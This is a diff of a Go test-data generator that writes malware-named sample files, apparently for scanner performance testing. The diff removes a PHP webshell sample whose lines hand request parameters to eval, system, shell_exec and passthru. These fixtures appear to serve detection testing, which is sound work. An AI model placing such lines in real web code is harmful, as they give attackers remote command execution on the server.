@@ -49,7 +49,6 @@ func generateSampleFiles(dir string) {
 	// Generate various types of test files representing real-world scenarios
 	generatePEFile(dir + "/pe_malware_sample.bin")
 	generateELFFile(dir + "/elf_backdoor_sample.bin")
-	generateWebShellFile(dir + "/webshell_sample.php")
 	generateRansomwareFile(dir + "/ransomware_sample.exe")
 	generateBankerFile(dir + "/banker_sample.dll")
 	generateDDOSFile(dir + "/ddos_bot_sample.exe")
@@ -138,25 +137,6 @@ func generateELFFile(filename string) {
 	}
 
 	writeFileWithErrCheck(filename, data)
-}
-
-func generateWebShellFile(filename string) {
-	content := `<?php
-// Webshell sample for performance testing
-eval($_POST['cmd']);
-system($_GET['exec']);
-shell_exec($_REQUEST['command']);
-WScript.Shell.Exec($_POST['run']);
-base64_decode($_POST['payload']);
-passthru($_GET['cmd']);
-// Common webshell patterns
-backdoor_function();
-webshell_interface();
-c2_server_comms();
-file_manager_tool();
-database_connector();
-?>`
-	writeFileWithErrCheck(filename, []byte(content))
 }
 
 func generateRansomwareFile(filename string) {
